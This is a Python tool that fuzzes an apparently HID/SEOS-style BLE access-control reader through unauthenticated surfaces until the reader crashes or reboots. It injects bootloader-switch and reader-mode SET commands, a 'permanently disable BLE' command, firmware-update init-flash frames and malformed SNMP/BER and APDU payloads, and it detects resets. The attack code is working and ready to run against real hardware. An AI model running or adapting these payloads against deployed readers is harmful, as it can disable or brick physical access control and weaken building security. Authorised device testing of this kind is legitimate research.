#!/usr/bin/env python3
"""Fuzz the reader until it resets / reboots / crashes -- deeper than hid_rm.fuzz.

Target surfaces (all reachable unauthenticated, see PROTOCOL.md):
  1. Management tunnel (OPERATION_SELECTOR poll loop, sec:31) -- inject trigger
     /bootloader OIDs (GET+SET) and malformed SNMP/BER into the GET_DATA poll.
     This is the layer hid_rm.fuzz did NOT reach (it only fuzzed the ISO7816
     credential-read reply and the BLE-fragment layer).
  2. BLE-fragment / status-word layer (hid_rm.fuzz cases) on fresh connections.

Crash/reboot is detected three ways, most to least definitive:
  A. REBOOT    -- the reader disappears from BLE advertising and comes back after
                  a gap (watchdog reset / power-cycle). We re-scan after any
                  disconnect and time its reappearance.
  B. ABRUPT    -- the link drops WITHOUT a clean EOT (0xE1) status first, mid-
                  transaction (the reader normally sends EOT before/after a clean
                  end; a hard drop with no EOT = likely crash/hang).
  C. STALL     -- no reply to an injected command within the window (hang), while
                  the link is nominally still up.

A normal, clean session end is an EOT (e1 0x) with the link still connected --
that is NOT a crash. We only flag A/B/C.

Usage:
    python3 tools/fuzz_crash.py <MAC> [--only tunnel|frag|all] [--rounds N] [-v]
"""
import argparse
import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hid_rm import DATA_CHAR_UUID, framing, snmpv3, tunnel, seos
from hid_rm import fuzz as hid_fuzz

MAC_DEFAULT = "C0:60:33:15:2B:31"
OPERATION_SELECTOR_AID = bytes.fromhex("a000000382002f000101")
FCI_OK = bytes.fromhex("6f0885060201400201009000")
SW_NOT_FOUND = bytes.fromhex("6a82")
SW_OK = bytes.fromhex("9000")

PER_MSG_TIMEOUT = 3.0


# --------------------------------------------------------------------------- #
# crash / reboot detection
# --------------------------------------------------------------------------- #
async def reader_present(mac: str, timeout: float = 3.0) -> bool:
    """True if the reader is currently advertising."""
    from bleak import BleakScanner
    found = {"v": False}

    async def check():
        found["v"] = mac in await BleakScanner.discover(timeout=timeout)

    # discover() is one-shot; run it
    devs = await BleakScanner.discover(timeout=timeout)
    return mac in devs


async def wait_for_reappear(mac: str, up_to: float = 40.0, poll: float = 1.0) -> tuple[bool, float]:
    """After a disconnect, wait for the reader to re-advertise (reboot) and
    return (reappeared, seconds_until_reappear). If it's already up immediately,
    it was a clean link-drop, not a reboot."""
    t0 = time.monotonic()
    # small grace: a clean disconnect re-advertises almost instantly
    while time.monotonic() - t0 < up_to:
        await asyncio.sleep(poll)
        if await reader_present(mac):
            return True, time.monotonic() - t0
    return False, up_to


# --------------------------------------------------------------------------- #
# tunnel fuzz injections (management channel, sec:31)
# --------------------------------------------------------------------------- #
def _wrap(snmp: bytes, tag: int) -> bytes:
    """Wrap an SNMP message in the injected-command form (tunnel.py layout)."""
    def _ber_len(n):
        if n < 0x80:
            return bytes([n])
        if n < 0x100:
            return bytes([0x81, n])
        return bytes([0x82, n >> 8, n & 0xFF])
    inner = bytes([0x94]) + _ber_len(len(snmp)) + snmp
    outer = bytes([tag]) + _ber_len(len(inner)) + inner
    return bytes.fromhex("440a44000000") + outer + bytes.fromhex("9000")


def _get(oid_hex: str, offset: int = 0, length: int = 4) -> bytes:
    return tunnel.build_partial_read_get(bytes.fromhex(oid_hex), offset=offset, length=length)


def _set(oid_hex: str, value_hex: str, **kw) -> bytes:
    return snmpv3.build_set(bytes.fromhex(oid_hex), bytes.fromhex(value_hex),
                            engine_id=tunnel.FIXED_ENGINE_ID, user_name=tunnel.FIXED_USER,
                            engine_boots=0, engine_time=0, **kw)


def _set_wrapped(oid_hex: str, value_hex: str, **kw) -> bytes:
    return _wrap(_set(oid_hex, value_hex, **kw), snmpv3.SET_REQUEST)


def _inj(body: bytes) -> bytes:
    """Wrap an arbitrary body as an injected command (44 0A 44 00 00 00 <body> 90 00)."""
    return bytes.fromhex("440a44000000") + body + bytes.fromhex("9000")


def _ake(keyref: int, data: bytes) -> bytes:
    """SEOS AKE start (GET CHALLENGE / AUTHENTICATE) -- 00 87 00 <keyref> <data>."""
    return seos.seos_get_challenge(keyref, data)


TUNNEL_CASES = [
    # ---- trigger / bootloader OIDs (reboot candidates) ----
    ("GET  SWITCH_TO_SNMPLOADER",            _get("03000001"),  "bootloader trigger (GET)"),
    ("GET  SWITCH_TO_DISPATCHER_BOOTLOADER", _get("0301070157"),"dispatcher bootloader (GET)"),
    ("GET  SWITCH_TO_SMART_MODULE_BOOTLOADER",_get("030107016C"),"smart-module bootloader (GET)"),
    ("GET  STORE_OPERATION_ATOMIC_UPDATE",   _get("03000309"),  "atomic-update op (GET)"),
    ("GET  READER_MODE",                     _get("03000701"),  "reader operating mode (GET)"),
    ("SET  SWITCH_TO_SNMPLOADER=01",         _set_wrapped("03000001", "01"), "bootloader trigger (SET 01)"),
    ("SET  SWITCH_TO_DISPATCHER_BOOTLOADER=01", _set_wrapped("0301070157", "01"), "dispatcher bootloader (SET 01)"),
    ("SET  SWITCH_TO_SMART_MODULE_BOOTLOADER=01", _set_wrapped("030107016C", "01"), "smart-module bootloader (SET 01)"),
    ("SET  READER_MODE=01",                  _set_wrapped("03000701", "01"), "change reader mode (SET 01)"),
    ("SET  READER_MODE=02",                  _set_wrapped("03000701", "02"), "change reader mode (SET 02)"),
    ("SET  SIGNO_BLE_PERMANENT_DISABLE=01",  _set_wrapped("030107030A21", "01"), "permanently disable BLE (SET 01)"),
    ("SET  SWITCH_TO_SNMPLOADER=authPriv",   _set_wrapped("03000001", "01",
            auth_key=bytes(range(1, 17)), priv_key=bytes(range(17, 33))), "authPriv SET (exercises crypto path)"),

    # ---- SEOS AKE / crypto path (GET CHALLENGE / AUTHENTICATE) -- UNTESTED ----
    ("AKE  get-challenge keyref=0",          _ake(0, b""), "start AKE, keyref 0, empty"),
    ("AKE  get-challenge keyref=1 32B",      _ake(1, b"\xaa" * 32), "start AKE, 32B auth data"),
    ("AKE  get-challenge keyref=0xFF",       _ake(0xFF, b"\x00" * 8), "invalid keyref 0xFF"),
    ("AKE  get-challenge huge(255B)",        _ake(0, b"\x01" * 255), "255-byte auth data (max Lc)"),
    ("AKE  core-admin read-metadata",        seos.seos_read_all_metadata(), "80 15 01 03 06 00 (read all metadata)"),
    ("AKE  select-GDF keyref=0",             seos.seos_select_gdf(0), "80 A5 07 00 (select GDF)"),

    # ---- malformed SNMP / BER injection into the GET_DATA poll ----
    ("GET  huge-offset/length",              _get("030107012A", offset=0xFFFFFFFF, length=0xFFFFFFFF), "offset/length = 4GB (bounds)"),
    ("GET  zero-length",                     _get("030107012A", offset=0, length=0), "read 0 bytes"),
    ("GET  unknown-oid",                     _get("aabbccdd"), "unknown target OID"),
    ("SET  empty-value",                     _set_wrapped("030107012A", ""), "SET with empty octet value"),
    ("SET  huge-value(300B)",                _set_wrapped("030107012A", "aa" * 300), "SET 300-byte value (>MTU, many frags)"),
    ("INJ  garbage",                         _inj(bytes(range(32))), "raw 32B garbage in poll"),
    ("INJ  all-zeros-snmp",                  _inj(b"\x30" + b"\x00" * 60), "malformed SEQ of zeros"),
    ("INJ  empty-poll-reply",                bytes.fromhex("9000"), "bare 9000 to a GET_DATA poll"),
    ("INJ  double-command",                  _inj(_get("030107012A")[6:] + _get("03000001")[6:-2]), "two commands in one poll"),
]


async def run_tunnel_fuzz(mac: str, rounds: int = 1, verbose: bool = False) -> list:
    """One connection, engage the management tunnel, then inject each case.
    Returns a list of result dicts. Detects crash/reboot on any abnormal drop."""
    from bleak import BleakClient

    results = []
    for rnd in range(rounds):
        rx, ev = [], asyncio.Event()

        def on_notify(_, d):
            rx.append(bytes(d)); ev.set()

        async def drain(t=PER_MSG_TIMEOUT):
            try:
                await asyncio.wait_for(ev.wait(), timeout=t)
            except asyncio.TimeoutError:
                pass
            await asyncio.sleep(0.05)
            frames = list(rx); rx.clear(); ev.clear()
            return frames

        async def send(body: bytes):
            for frag in framing.ble_fragment(body):
                await c.write_gatt_char(DATA_CHAR_UUID, frag, response=False)
                await asyncio.sleep(0.02)

        c = BleakClient(mac)
        connected = False
        try:
            await c.connect()
            connected = True
            await c.start_notify(DATA_CHAR_UUID, on_notify)
            # NOTE: do NOT discard the spontaneous SELECT -- the reader sends its
            # AID hunt once and we must answer it (match live_full_config_pull.py).

            engaged = False
            pending = list(TUNNEL_CASES)
            got_put = 0
            iters = 0
            t_start = time.monotonic()
            while c.is_connected and (pending or not engaged) and iters < 120 \
                    and time.monotonic() - t_start < 70:
                iters += 1
                if not engaged:
                    # wait for the reader's SELECT; engage the tunnel
                    got = await drain(3.0)
                    if not got:
                        break
                    body = framing.ble_reassemble(got)
                    if not body or body[1] != 0xA4:
                        continue
                    aid = body[5:5 + body[4]] if len(body) >= 5 else b""
                    if aid == OPERATION_SELECTOR_AID:
                        await send(FCI_OK)
                        engaged = True
                        if verbose:
                            print("  [tunnel] engaged OPERATION_SELECTOR management tunnel")
                    else:
                        await send(SW_NOT_FOUND)
                    continue

                # engaged: respond to the reader's next GET_DATA poll with our case
                got = await drain(3.0)
                if not got:
                    break
                body = framing.ble_reassemble(got)
                if not body:
                    continue
                ins = body[1] if len(body) > 1 else None
                if ins == 0xCA and pending:  # GET_DATA poll -> inject a case
                    name, payload, note = pending.pop(0)
                    t0 = time.monotonic()
                    await send(payload)
                    if verbose:
                        print(f"  [tunnel] injected: {name}  ({note})")
                    # wait for the reader's answer (PUT_DATA) or an abnormal drop
                    ans = await drain(2.5)
                    if not ans:
                        results.append({"case": name, "note": note, "result": "STALL?",
                                        "frames": [f.hex() for f in ans], "round": rnd})
                        break
                    last = ans[-1]
                    is_eot = (last[0] & 0xE0) == 0xE0
                    if is_eot:
                        results.append({"case": name, "note": note,
                                        "result": f"EOT:{seos.EOT_STATUS.get(last[1], last[1])}",
                                        "frames": [f.hex() for f in ans], "round": rnd})
                        break
                    if body2_ins(ans) == 0xDA:  # normal PUT_DATA result
                        got_put += 1
                        decoded = decode_put(ans)
                        results.append({"case": name, "note": note, "result": "PUT_DATA(ok)",
                                        "detail": decoded, "frames": [f.hex() for f in ans], "round": rnd})
                        await send(SW_OK)  # ack, keep the loop alive
                    else:
                        results.append({"case": name, "note": note, "result": "OTHER",
                                        "frames": [f.hex() for f in ans], "round": rnd})
                        break
                elif ins == 0xA4:
                    # reader re-SELECTed (maybe a new hunt after a reset?) -- re-engage
                    aid = body[5:5 + body[4]] if len(body) >= 5 else b""
                    await send(FCI_OK if aid == OPERATION_SELECTOR_AID else SW_NOT_FOUND)
                elif ins == 0xDA:
                    await send(SW_OK)
                else:
                    # unknown / extension frame
                    break
        except Exception as e:
            results.append({"case": f"(exception)", "note": "", "result": type(e).__name__,
                            "frames": [], "round": rnd})
        finally:
            was_connected = c.is_connected
            try:
                await c.disconnect()
            except Exception:
                pass

        # Post-connection: is the reader still advertising, and did it reboot?
        if connected:
            present_now = await reader_present(mac)
            if not present_now:
                reappeared, secs = await wait_for_reappear(mac, up_to=45.0)
                verdict = f"REBOOT? (gone {secs:.1f}s, back={reappeared})"
            else:
                verdict = "present-after"
        else:
            verdict = "connect-fail"
        for r in results[-(len(TUNNEL_CASES) + 2):]:
            r["post"] = verdict
        return results


def body2_ins(ans):
    body = framing.ble_reassemble(ans)
    return body[1] if body and len(body) > 1 else None


def decode_put(ans) -> str:
    """Decode a reader PUT_DATA result: accepted value vs refusal, for reporting."""
    body = framing.ble_reassemble(ans)
    if not body:
        return "(empty)"
    try:
        pr = tunnel.parse_response(body)
    except Exception:
        pr = None
    if pr and pr.get("value"):
        v = pr["value"]
        txt = " ".join(f"{c:02x}" for c in v[:24]) + ("…" if len(v) > 24 else "")
        return f"value[{len(v)}B]={txt}"
    if pr and pr.get("encrypted"):
        return "encrypted(authPriv refusal?)"
    if pr and pr.get("target_oid"):
        return f"refused (oid {pr['target_oid']})"
    # try session_decode
    try:
        from hid_rm import session_decode as SD
        ev = SD.classify("rx", body)
        if ev.get("snmp"):
            s = ev["snmp"]
            if s.get("varbinds"):
                o, val = s["varbinds"][0]
                return f"value[{len(bytes.fromhex(val)) if val else 0}B]={val[:32]}…" if len(val) > 32 else f"value={val}"
            return f"pdu={s.get('pdu_type')} enc={s.get('encrypted')}"
        if ev.get("version"):
            return f"version={ev['version']}"
    except Exception:
        pass
    return f"raw[{len(body)}B]={body[:24].hex()}…"


# --------------------------------------------------------------------------- #
# extension-frame fuzz (0xE2 FW_UPDATE, 0xE5 CONFIGURATION) -- untested surface
# --------------------------------------------------------------------------- #
EXT_CASES = [
    ("EXT 0xE2 FW_UPDATE init-flash",        seos.ext_frame(2, seos.REQUEST_INIT_FLASH), "FW_UPDATE: init flash"),
    ("EXT 0xE2 FW_UPDATE init-flash-ack",    seos.ext_frame(2, seos.REQUEST_INIT_FLASH_ACK), "FW_UPDATE: init flash ack"),
    ("EXT 0xE2 FW_UPDATE garbage",           seos.ext_frame(2, b"\xaa" * 16), "FW_UPDATE: 16B garbage"),
    ("EXT 0xE5 CONFIGURATION empty",         seos.ext_frame(5, b""), "CONFIG fragment: empty"),
    ("EXT 0xE5 CONFIGURATION garbage",       seos.ext_frame(5, b"\xbb" * 16), "CONFIG fragment: 16B garbage"),
    ("EXT 0xE3 (unused) empty",              seos.ext_frame(3, b""), "unused extension type 3"),
    ("EXT 0xE0 (raw) empty",                 bytes([0xE0]), "bare extension header 0xE0"),
    ("EXT 0xE1 EOT fake",                    seos.ext_frame(1, b"\x02"), "fake EOT status we send"),
]


async def run_ext_fuzz(mac: str, verbose: bool = False) -> list:
    """Send extension frames (a third sub-protocol) directly as single-fragment
    writes. These were 'deliberately NOT fuzzed' (potentially destructive)."""
    from bleak import BleakClient
    results = []
    for name, payload, note in EXT_CASES:
        rx, ev = [], asyncio.Event()

        def on_notify(_, d):
            rx.append(bytes(d)); ev.set()

        disc = {"lost": False}
        connected = False
        try:
            c = BleakClient(mac, disconnected_callback=lambda _: disc.__setitem__("lost", True))
            await c.connect()
            connected = True
            await c.start_notify(DATA_CHAR_UUID, on_notify)
        except Exception as e:
            results.append({"case": name, "result": "CONNECT-FAIL", "detail": str(e), "note": note, "post": ""})
            await asyncio.sleep(1.5)
            continue

        async def drain(t=2.5):
            try:
                await asyncio.wait_for(ev.wait(), timeout=t)
            except asyncio.TimeoutError:
                pass
            await asyncio.sleep(0.4)
            frames = list(rx); rx.clear(); ev.clear()
            return frames

        await drain(2.5)  # let the reader settle / send its spontaneous SELECT
        outcome, detail = "OK", ""
        try:
            await c.write_gatt_char(DATA_CHAR_UUID, payload, response=False)
            got = await drain(2.5)
            if not got:
                outcome, detail = "STALL?", "no reply after ext frame"
            else:
                last = got[-1]
                if (last[0] & 0xE0) == 0xE0:
                    outcome, detail = f"EOT:{seos.EOT_STATUS.get(last[1], last[1])}", "clean status"
                else:
                    outcome, detail = "REPLY", seos.describe(last)
        except Exception as e:
            outcome, detail = "EXC", type(e).__name__
        try:
            await c.disconnect()
        except Exception:
            pass

        # reboot detection
        post = ""
        if disc["lost"]:
            present_now = await reader_present(mac)
            if not present_now:
                reappeared, secs = await wait_for_reappear(mac, up_to=45.0)
                post = f"reader gone {secs:.1f}s back={reappeared}"
                if reappeared and secs > 2.0:
                    outcome = "REBOOT?"
            else:
                post = "link-lost, still advertising"
        results.append({"case": name, "result": outcome, "detail": detail, "note": note, "post": post})
        await asyncio.sleep(1.5)
    return results


# --------------------------------------------------------------------------- #
# fragment / SW layer on fresh connections (hid_rm.fuzz cases)
# --------------------------------------------------------------------------- #
async def run_frag_fuzz(mac: str, cooldown: float = 2.0, verbose: bool = False) -> list:
    results = []
    for name, frags, note in hid_fuzz.cases():
        from bleak import BleakClient
        rx, ev = [], asyncio.Event()

        def on_notify(_, d):
            rx.append(bytes(d)); ev.set()

        disc = {"lost": False}
        try:
            c = BleakClient(mac, disconnected_callback=lambda _: disc.__setitem__("lost", True))
            await c.connect()
            await c.start_notify(DATA_CHAR_UUID, on_notify)
        except Exception as e:
            results.append({"case": name, "result": "CONNECT-FAIL", "detail": str(e), "post": ""})
            await asyncio.sleep(cooldown)
            continue

        async def drain(t=2.5):
            try:
                await asyncio.wait_for(ev.wait(), timeout=t)
            except asyncio.TimeoutError:
                pass
            await asyncio.sleep(0.4)
            frames = list(rx); rx.clear(); ev.clear()
            return frames

        spontaneous = await drain(3.0)
        outcome, detail = "OK", ""
        try:
            for fr in frags:
                await c.write_gatt_char(DATA_CHAR_UUID, fr, response=False)
                await asyncio.sleep(0.05)
            got = await drain(2.5)
            if not got:
                outcome, detail = "STALL?", "no reply"
            else:
                last = got[-1]
                if (last[0] & 0xE0) == 0xE0:
                    outcome, detail = f"EOT:{seos.EOT_STATUS.get(last[1], last[1])}", "clean status"
                else:
                    outcome, detail = "REPLY", seos.describe(last)
        except Exception as e:
            outcome, detail = "EXC", type(e).__name__
        try:
            await c.disconnect()
        except Exception:
            pass

        # reboot detection
        if disc["lost"] and not c.is_connected:
            present_now = await reader_present(mac)
            if not present_now:
                reappeared, secs = await wait_for_reappear(mac, up_to=45.0)
                detail += f"  [link-lost; reader gone {secs:.1f}s back={reappeared}]"
                if reappeared and secs > 2.0:
                    outcome = "REBOOT?"
            else:
                detail += "  [link-lost but still advertising]"
        results.append({"case": name, "result": outcome, "detail": detail, "note": note})
        await asyncio.sleep(cooldown)
    return results


# --------------------------------------------------------------------------- #
def render(results: list, title: str) -> str:
    lines = [f"== {title} =="]
    for r in results:
        flag = ""
        res = r.get("result", "")
        if "REBOOT?" in res or "STALL?" in res or "EXC" in res or "CONNECT-FAIL" in res:
            flag = "   <-- FLAG"
        detail = r.get("detail", "") or r.get("note", "")
        post = f"  [{r['post']}]" if r.get("post") else ""
        lines.append(f"  {r['case']:40} {res:18} {detail}{post}{flag}")
    return "\n".join(lines)


async def main(mac, only, rounds, verbose):
    sys.stdout.reconfigure(line_buffering=True)
    print(f"target: {mac}\n")
    out = []
    if only in ("tunnel", "all"):
        print("### Phase 1: management-tunnel fuzz (trigger/bootloader OIDs + AKE + malformed SNMP/BER)")
        res = await run_tunnel_fuzz(mac, rounds=rounds, verbose=verbose)
        out.append(render(res, "management-tunnel fuzz"))
        print("\n### Phase 2: extension-frame fuzz (0xE2 FW_UPDATE / 0xE5 CONFIG / unused types)")
        res = await run_ext_fuzz(mac, verbose=verbose)
        out.append(render(res, "extension-frame fuzz"))
    if only in ("frag", "all"):
        print("\n### Phase 2: fragment / status-word fuzz (fresh connections)")
        res = await run_frag_fuzz(mac, verbose=verbose)
        out.append(render(res, "fragment/SW fuzz"))
    print("\n".join(out))


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    ap.add_argument("--only", choices=["tunnel", "frag", "all"], default="all")
    ap.add_argument("--rounds", type=int, default=1, help="tunnel fuzz rounds (repeat the case list)")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    asyncio.run(main(args.mac, args.only, args.rounds, args.verbose))
